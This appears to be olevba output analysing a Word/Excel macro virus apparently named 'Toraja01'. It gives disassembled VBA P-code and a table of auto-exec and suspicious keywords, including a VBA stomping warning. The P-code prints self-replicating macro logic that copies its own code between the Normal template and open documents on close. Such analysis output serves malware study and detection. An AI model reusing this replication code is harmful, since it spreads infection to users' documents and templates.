' Line #362:
' 	FuncDefn (Sub Xls())
' Line #363:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	Set Active 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	ArgsLd Workbooks 0x0001 
' 	Set Temp 
' 	BoS 0x0000 
' 	Ld Application 
' 	MemLd TemplatesPath 
' 	St tempPath 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld Workbooks 
' 	Set AllActive 
' Line #364:
' 	EndSub 
' Line #365:
' 	FuncDefn (Sub CreateThisDocAD())
' Line #366:
' 	OnError Salah 
' Line #367:
' 	Dim 
' 	VarDefn i
' 	VarDefn VBCompNT
' 	VarDefn VBCompAD
' Line #368:
' 	Dim 
' 	VarDefn sLine (As String)
' Line #369:
' 	SetStmt 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set VBCompNT 
' Line #370:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set VBCompAD 
' Line #371:
' 	Ld VBCompNT 
' 	MemLd CountOfLines 
' 	Ld VBCompAD 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ne 
' 	IfBlock 
' Line #372:
' 	LitDI2 0x0001 
' 	Ld VBCompAD 
' 	MemLd CountOfLines 
' 	Ld VBCompAD 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #373:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VBCompNT 
' 	MemLd CountOfLines 
' 	For 
' Line #374:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld VBCompNT 
' 	ArgsMemLd Lines 0x0002 
' 	St sLine 
' Line #375:
' 	Ld sLine 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	Ld sLine 
' 	Ld sLine 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Ld VBCompAD 
' 	ArgsMemCall InsertLines 0x0002 
' 	Else 
' 	BoSImplicit 
' 	Ld i 
' 	LitStr 0x0001 "'"
' 	Ld sLine 
' 	Concat 
' 	Ld VBCompAD 
' 	ArgsMemCall InsertLines 0x0002 
' 	EndIf 
' Line #376:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #377:
' 	EndIfBlock 
' Line #378:
' 	Label Salah 
' Line #379:
' 	EndSub 
' Line #380:
' 	QuoteRem 0x0000 0x001A "Function CheckComp(Tujuan)"
' Line #381:
' 	QuoteRem 0x0000 0x0010 "Dim i, x, VBComp"
' Line #382:
' 	QuoteRem 0x0000 0x0028 "Dim sLine As String: Dim blnM As Boolean"
' Line #383:
' 	QuoteRem 0x0000 0x0018 "Const mName = "Toraja01""
' Line #384:
' 	QuoteRem 0x0000 0x000C "blnM = False"
' Line #385:
' 	QuoteRem 0x0000 0x0030 "For Each VBComp In Tujuan.VBProject.VBComponents"
' Line #386:
' 	QuoteRem 0x0000 0x0051 "   If VBComp.Name <> "ThisDocument" And VBComp.Name <> "Reference To Normal" Then"
' Line #387:
' 	LineCont 0x0008 01 00 9B FF 01 00 39 FF
' 	QuoteRem 0x0000 0x010B "        If VBComp.Name = mName Then If Tujuan.VBProject.VBComponents(mName).CodeModule.CountOfLines ='           ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines - 1 Then'            blnM = True Else GoSub RemoveKomp Else GoSub RemoveKomp"
' Line #388:
' 	QuoteRem 0x0000 0x0009 "   End If"
' Line #389:
' 	QuoteRem 0x0000 0x000B "Next VBComp"
' Line #390:
' 	QuoteRem 0x0000 0x0014 "If blnM = False Then"
' Line #391:
' 	QuoteRem 0x0000 0x0027 "x = Tujuan.VBProject.VBComponents.Count"
' Line #392:
' 	QuoteRem 0x0000 0x0023 "Tujuan.VBProject.VBComponents.Add 1"
' Line #393:
' 	QuoteRem 0x0000 0x0031 "Tujuan.VBProject.VBComponents(x + 1).Name = mName"
' Line #394:
' 	QuoteRem 0x0000 0x003C "Set VBComp = Tujuan.VBProject.VBComponents(mName).CodeModule"
' Line #395:
' 	QuoteRem 0x0000 0x005A "For i = 1 To ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines"
' Line #396:
' 	QuoteRem 0x0000 0x0059 "     sLine = ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.Lines(i, 1)"
' Line #397:
' 	QuoteRem 0x0000 0x007B "     If Left(sLine, 1) = "'" Then VBComp.InsertLines i, Right(sLine, Len(sLine) - 1) Else VBComp.InsertLines i, "'" & sLine"
' Line #398:
' 	QuoteRem 0x0000 0x0006 "Next i"
' Line #399:
' 	QuoteRem 0x0000 0x0029 "If Len(Tujuan.Path) <> 0 Then Tujuan.Save"
' Line #400:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #401:
' 	QuoteRem 0x0000 0x0006 "Salah:"
' Line #402:
' 	QuoteRem 0x0000 0x000D "Exit Function"
' Line #403:
' 	QuoteRem 0x0000 0x000B "RemoveKomp:"
' Line #404:
' 	QuoteRem 0x0000 0x0057 "Tujuan.VBProject.VBComponents.Remove Tujuan.VBProject.VBComponents(VBComp.Name): Return"
' Line #405:
' 	QuoteRem 0x0000 0x000C "End Function"
' Line #406:
' 	QuoteRem 0x0000 0x000F "Sub AutoClose()"
' Line #407:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #408:
' 	QuoteRem 0x0000 0x0018 "CheckComp NormalTemplate"
' Line #409:
' 	QuoteRem 0x0000 0x0018 "CheckComp ActiveDocument"
' Line #410:
' 	QuoteRem 0x0000 0x001B "Application.Run "RemoveAll""
' Line #411:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #412:
' 	QuoteRem 0x0000 0x0000 ""
' Line #413:
' Line #414:
' 	QuoteRem 0x0000 0x0000 ""
' Line #415:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Register            |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

